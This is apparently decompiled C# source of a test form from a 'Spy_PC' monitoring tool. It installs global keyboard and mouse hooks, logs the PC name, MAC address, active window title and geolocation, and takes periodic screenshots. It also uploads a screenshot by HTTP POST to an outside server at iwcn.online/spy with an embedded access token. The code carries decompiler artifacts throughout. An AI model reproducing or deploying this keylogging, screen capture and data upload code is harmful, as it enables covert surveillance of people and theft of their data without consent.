using System;
using System.ComponentModel;
using System.Device.Location;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;
using Gma.UserActivityMonitor;

namespace Spy_PC;

public class Testing : Form
{
	private GeoCoordinateWatcher Watcher;

	private AES_CryptoClass aesCrypto = new AES_CryptoClass();

	private model mdl = new model();

	private int count;

	private IContainer components;

	private Button button1;

	private Label label1;

	private Timer timer1;

	private TextBox textBoxLog;

	private Label labelWheel;

	private Label labelMousePosition;

	private Label label2;

	private Label label3;

	public Testing()
	{
		InitializeComponent();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_00e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0115: Unknown result type (might be due to invalid IL or missing references)
		//IL_0167: Unknown result type (might be due to invalid IL or missing references)
		string text = DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds.ToString();
		string text2 = "";
		string text3 = "";
		text2 = "yes";
		string tempPath = Path.GetTempPath();
		Console.WriteLine(tempPath);
		mdl.FullScreenshot(tempPath ?? "", text + ".png", ImageFormat.get_Png());
		text3 = tempPath + text + ".png";
		Console.WriteLine("Screenshort  path: " + text3);
		string text4 = "http://iwcn.online/spy/index.php?user=tracker_add_activity&token=MlTKLWzv%2BWFRdinMi4GRt2ooIjvmjDwncqa3MtPlpJo%3D";
		string text5 = "24";
		if (text5 != "" && text2 == "yes")
		{
			WebClient webClient = new WebClient();
			webClient.Headers.Add("Content-Type", "binary/octet-stream");
			MessageBox.Show("Uploading.. Image URL>" + text4);
			MessageBox.Show(text4 + "&mac_address=MAC21452255&pc_name=Rishabh&image_name=" + text + ".png&image=true&image_id=" + text5);
			byte[] array = webClient.UploadFile(text4 + "&mac_address=MacAddress54522&pc_name=Rishabh&image=true&image_id=" + text5, "POST", text3);
			string @string = Encoding.UTF8.GetString(array, 0, array.Length);
			Console.WriteLine("Image uploaded>>>> " + @string);
			MessageBox.Show("Image uploaded>>>> " + @string);
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		Watcher.Start();
		count++;
		Console.WriteLine("Current PC name: " + mdl.getPC_Name());
		Console.WriteLine("Current Mac address: " + mdl.GetMACAddress2());
		Console.WriteLine("Current Active Windows: " + mdl.GetActiveWindowTitle());
		Console.WriteLine("Current Location: " + mdl.GetLocationProperty());
		_ = new string[6] { "Google Chrome", "chrome", "Opera", "Firfox", "Microsoft Edge", "IE" };
		string tempPath = Path.GetTempPath();
		Console.WriteLine(tempPath);
		mdl.FullScreenshot(tempPath ?? "", count + ".png", ImageFormat.get_Png());
	}

	private bool IsBrowser(string stringToCheck, string[] stringArray)
	{
		bool result = false;
		foreach (string value in stringArray)
		{
			if (stringToCheck.Contains(value))
			{
				result = true;
			}
		}
		return result;
	}

	private string BrowserName(string stringToCheck, string[] stringArray)
	{
		string result = "";
		foreach (string text in stringArray)
		{
			if (stringToCheck.Contains(text))
			{
				result = text;
			}
		}
		return result;
	}

	private void HookManager_KeyDown(object sender, KeyEventArgs e)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		((TextBoxBase)textBoxLog).AppendText($"KeyDown - {e.get_KeyCode()}\n");
		((TextBoxBase)textBoxLog).ScrollToCaret();
	}

	private void HookManager_KeyUp(object sender, KeyEventArgs e)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		((TextBoxBase)textBoxLog).AppendText($"KeyUp - {e.get_KeyCode()}\n");
		((TextBoxBase)textBoxLog).ScrollToCaret();
	}

	private void HookManager_KeyPress(object sender, KeyPressEventArgs e)
	{
		((TextBoxBase)textBoxLog).AppendText($"KeyPress - {e.get_KeyChar()}\n");
		((TextBoxBase)textBoxLog).ScrollToCaret();
	}

	private void HookManager_MouseMove(object sender, MouseEventArgs e)
	{
		((Control)labelMousePosition).set_Text($"x={e.get_X():0000}; y={e.get_Y():0000}");
	}

	private void HookManager_MouseClick(object sender, MouseEventArgs e)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		((TextBoxBase)textBoxLog).AppendText($"MouseClick - {e.get_Button()}\n");
		((TextBoxBase)textBoxLog).ScrollToCaret();
	}

	private void HookManager_MouseUp(object sender, MouseEventArgs e)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		((TextBoxBase)textBoxLog).AppendText($"MouseUp - {e.get_Button()}\n");
		((TextBoxBase)textBoxLog).ScrollToCaret();
	}

	private void HookManager_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		((TextBoxBase)textBoxLog).AppendText($"MouseDown - {e.get_Button()}\n");
		((TextBoxBase)textBoxLog).ScrollToCaret();
	}

	private void HookManager_MouseDoubleClick(object sender, MouseEventArgs e)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		((TextBoxBase)textBoxLog).AppendText($"MouseDoubleClick - {e.get_Button()}\n");
		((TextBoxBase)textBoxLog).ScrollToCaret();
	}

	private void HookManager_MouseWheel(object sender, MouseEventArgs e)
	{
		((Control)labelWheel).set_Text($"Wheel={e.get_Delta():000}");
	}

	private void Testing_Load(object sender, EventArgs e)
	{
	}

	private void Watcher_StatusChanged(object sender, GeoPositionStatusChangedEventArgs e)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		Console.WriteLine("Watcher chnaged..");
		if ((int)e.get_Status() == 0)
		{
			if (Watcher.get_Position().get_Location().get_IsUnknown())
			{
				Console.WriteLine("Watcher not done..");
				Console.WriteLine("Cannot find location data");
				return;
			}
			Console.WriteLine("Watcher done..");
			Console.Write(Watcher.get_Position().get_Location().get_Latitude()
				.ToString());
			((Control)label2).set_Text(Watcher.get_Position().get_Location().get_Latitude()
				.ToString());
			Console.WriteLine(Watcher.get_Position().get_Location().get_Longitude()
				.ToString());
			((Control)label3).set_Text(Watcher.get_Position().get_Location().get_Longitude()
				.ToString());
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_017a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0184: Expected O, but got Unknown
		//IL_018c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0196: Expected O, but got Unknown
		//IL_019e: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a8: Expected O, but got Unknown
		//IL_01af: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b9: Expected O, but got Unknown
		//IL_026e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0278: Expected O, but got Unknown
		//IL_02fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0306: Expected O, but got Unknown
		components = new Container();
		button1 = new Button();
		label1 = new Label();
		timer1 = new Timer(components);
		textBoxLog = new TextBox();
		labelWheel = new Label();
		labelMousePosition = new Label();
		label2 = new Label();
		label3 = new Label();
		GlobalEventProvider globalEventProvider = new GlobalEventProvider();
		((Control)this).SuspendLayout();
		((Control)button1).set_Location(new Point(15, 23));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(0);
		((Control)button1).set_Text("button1");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(12, 60));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(35, 13));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("label1");
		timer1.set_Interval(5000);
		timer1.add_Tick((EventHandler)timer1_Tick);
		globalEventProvider.MouseMove += new MouseEventHandler(HookManager_MouseMove);
		globalEventProvider.MouseClick += new MouseEventHandler(HookManager_MouseClick);
		globalEventProvider.MouseUp += new MouseEventHandler(HookManager_MouseUp);
		globalEventProvider.KeyPress += new KeyPressEventHandler(HookManager_KeyPress);
		((Control)textBoxLog).set_Dock((DockStyle)4);
		((Control)textBoxLog).set_Location(new Point(180, 0));
		((TextBoxBase)textBoxLog).set_Multiline(true);
		((Control)textBoxLog).set_Name("textBoxLog");
		((TextBoxBase)textBoxLog).set_ReadOnly(true);
		textBoxLog.set_ScrollBars((ScrollBars)2);
		((Control)textBoxLog).set_Size(new Size(271, 283));
		((Control)textBoxLog).set_TabIndex(9);
		((TextBoxBase)textBoxLog).set_WordWrap(false);
		((Control)labelWheel).set_Anchor((AnchorStyles)9);
		((Control)labelWheel).set_AutoSize(true);
		((Control)labelWheel).set_Font(new Font("Courier New", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)labelWheel).set_Location(new Point(68, 153));
		((Control)labelWheel).set_Name("labelWheel");
		((Control)labelWheel).set_Size(new Size(106, 16));
		((Control)labelWheel).set_TabIndex(11);
		((Control)labelWheel).set_Text("Wheel={0:####}");
		((Control)labelMousePosition).set_Anchor((AnchorStyles)9);
		((Control)labelMousePosition).set_AutoSize(true);
		((Control)labelMousePosition).set_Font(new Font("Courier New", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)labelMousePosition).set_Location(new Point(12, 137));
		((Control)labelMousePosition).set_Name("labelMousePosition");
		((Control)labelMousePosition).set_Size(new Size(162, 16));
		((Control)labelMousePosition).set_TabIndex(10);
		((Control)labelMousePosition).set_Text("x={0:####}; y={1:####}");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(15, 205));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(35, 13));
		((Control)label2).set_TabIndex(12);
		((Control)label2).set_Text("label2");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Location(new Point(15, 232));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(35, 13));
		((Control)label3).set_TabIndex(12);
		((Control)label3).set_Text("label2");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(451, 283));
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)labelWheel);
		((Control)this).get_Controls().Add((Control)(object)labelMousePosition);
		((Control)this).get_Controls().Add((Control)(object)textBoxLog);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).set_Name("Testing");
		((Control)this).set_Text("Testing");
		((Form)this).add_Load((EventHandler)Testing_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
